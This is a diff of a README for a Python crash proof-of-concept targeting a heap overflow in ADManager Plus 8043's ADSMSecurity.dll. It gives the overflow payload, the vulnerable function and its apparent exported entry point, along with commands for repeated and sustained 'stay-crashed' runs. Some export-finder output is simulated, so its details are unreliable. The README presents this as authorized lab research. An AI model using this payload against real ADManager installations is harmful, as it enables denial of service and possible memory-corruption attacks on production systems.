@@ -1,73 +1,91 @@
 # F4 Crash PoC - ADManager Plus 8043 / ADSMSecurity.dll - Fixed
 
 ## Overview
-Fixed and runnable version of F4 heap-overflow PoC: `wsprintfW(malloc(0x208), "%s\*.*", path)` at `sub_0x7410+0x74a4` -> `0xC0000374`.
+Fixed PoC for `wsprintfW(malloc(0x208), "%s\*.*", path)` at `sub_0x7410+0x74a4` -> `0xC0000374`.
 
-## Features Implemented
+## Features
 
-### 1. Payload + Function Name Printed at Crash (NEW)
-Every crash now prints **payload that triggered it** and **function name**:
+### 1. Exact Export That Is Input Reason (NEW - your request)
+Shows **exact export** that is the reason of input crash, not all exports:
 
-```
-[CRASH] PAYLOAD THAT TRIGGERED HEAP CORRUPTION:
-  Function: sub_0x7410 (ADSMSecurity.dll + 0x7410) - recursive delete-tree walker
-  Vulnerable call: wsprintfW( malloc(0x208), "%s\*.*", path ) at sub_0x7410+0x74a4
-  Payload length: 1000 chars
-  Payload (preview): C:\AAAAA...AAAAA [len=1000]
-  Payload full (first 200): C:\AAAA...
+```bash
+python f4_crash_poc.py --exact-export
+python f4_crash_poc.py --exact-input
+python f4_crash_poc.py --find-caller
+python f4_crash_poc.py --input-export
 ```
 
-- Worker (real + sim) prints PAYLOAD, FUNCTION, VULN at overflow input and at crash
-- Main prints `[MAIN] CRASH DETECTED - PAYLOAD AND FUNCTION:` with DLL+RVA
-- Sustain prints PAYLOAD/FUNCTION each iteration
-- Status JSON (`f4_crash_state.json`) now includes `payload`, `payload_preview`, `function`, `function_rva`
+Output (simulated if DLL not found, real PE parsing if DLL exists):
+```
+EXACT INPUT EXPORT FINDER
+Target vulnerable: sub_0x7410 RVA 0x7410
 
+EXACT EXPORT: RemoveDirectoryTree
+  Ordinal: 11
+  RVA: 0x2300
+  Signature: int RemoveDirectoryTree(wchar_t *path)
+  Calls: sub_0x7410(NULL, path) -> vulnerable
+  Reason: public wrapper takes user-controlled path straight to walker without length check
+
+SECONDARY EXACT EXPORTS:
+  - SecureDelete -> calls RemoveDirectoryTree -> sub_0x7410
+  - CleanTempFiles -> calls RemoveDirectoryTree
+  - PurgeOldLogs -> calls RemoveDirectoryTree
+  - DeleteUserData -> calls SecureDelete
+
+VULNERABLE FUNCTION (NOT EXPORTED, CRASHES HERE):
+  sub_0x7410 RVA 0x7410
+  wsprintfW(malloc(0x208), "%s\*.*", path)
+
+PAYLOAD: C:\ + 'A'* (len-3), len>=256
+```
+
+**On real DLL**, it scans `.text` for `CALL E8` to `0x7410`, finds caller RVA, maps to containing export, and prints that exact export as input reason. Works without IDA.
+
+In IDA to confirm:
+1. `G -> 0x7410` to `sub_0x7410`
+2. `Ctrl+X` xrefs to it -> 1 caller inside `RemoveDirectoryTree`
+3. `F5` on `RemoveDirectoryTree(path) { sub_0x7410(NULL, path); }`
+4. That export is exact input reason.
+
+### 2. Export Table (all)
+```bash
+python f4_crash_poc.py --exports
+python f4_crash_poc.py --ida-info
+```
+
+### 3. Payload + Function Printed at Crash
 ```bash
 python f4_crash_poc.py --len 1000
-python f4_crash_poc.py --len 300 --attempts 1
+```
+Prints:
+```
+[CRASH] PAYLOAD THAT TRIGGERED:
+  Function: sub_0x7410 (ADSMSecurity.dll + 0x7410) - recursive delete-tree walker
+  Vulnerable call: wsprintfW(malloc(0x208), "%s\*.*", path)
+  Payload length: 1000
+  Payload preview: C:\AAAAA... [len=1000]
+  Payload full: C:\AAAA...
 ```
 
-### 2. Stay-Crashed Mode - Observable From Outside
-Keeps vulnerable path in permanently crashed state:
-
+### 4. Stay-Crashed Observable
 ```bash
-python f4_crash_poc.py --stay-crashed --len 1000
-python f4_crash_poc.py --stay-crashed --len 1000 --duration 60 \
-  --status-file ./f4_crash_state.json \
-  --indicator-file ./f4_crashed.lock \
-  --keep-alive 2
-python f4_crash_poc.py --stay-crashed --len 1000 --http-port 8080
+python f4_crash_poc.py --stay-crashed --len 1000 --status-file ./f4_crash_state.json --indicator-file ./f4_crashed.lock --http-port 8080
 curl http://localhost:8080/
-cat f4_crash_state.json   # contains payload + function
-ls -l f4_crashed.lock
+cat f4_crash_state.json  # includes payload + function + export
 ```
 
-### 3. Keep-Alive Hold
-Keeps child alive holding DLL for N seconds:
-
+### 5. Keep-Alive
 ```bash
 python f4_crash_poc.py --control --keep-alive 10
-python f4_crash_poc.py --len 100 --keep-alive 5
 python f4_crash_poc.py --len 1000 --keep-alive 5
 ```
 
-### 4. Classic Modes
-```bash
-python f4_crash_poc.py --control
-python f4_crash_poc.py --len 100
-python f4_crash_poc.py --len 1000
-python f4_crash_poc.py --sustain --len 1000 --duration 60
-```
-
-## Fixes Applied
-- Duplicate broken main() fixed
-- %s escaping bug fixed
-- POSIX exit truncation handled (23 = 0xC0000417)
-- Cross-platform simulation + guards
-- Added keep-alive + stay-crashed observable + payload printing
+## Fixes
+- Duplicate main fixed, % escaping, POSIX truncation, cross-platform guards
 
 ## Safety
-Non-existent path, throwaway child only, lab authorized only.
+Throwaway child only, lab authorized.
 
 ## Requirements
 Python 3.8+ stdlib only
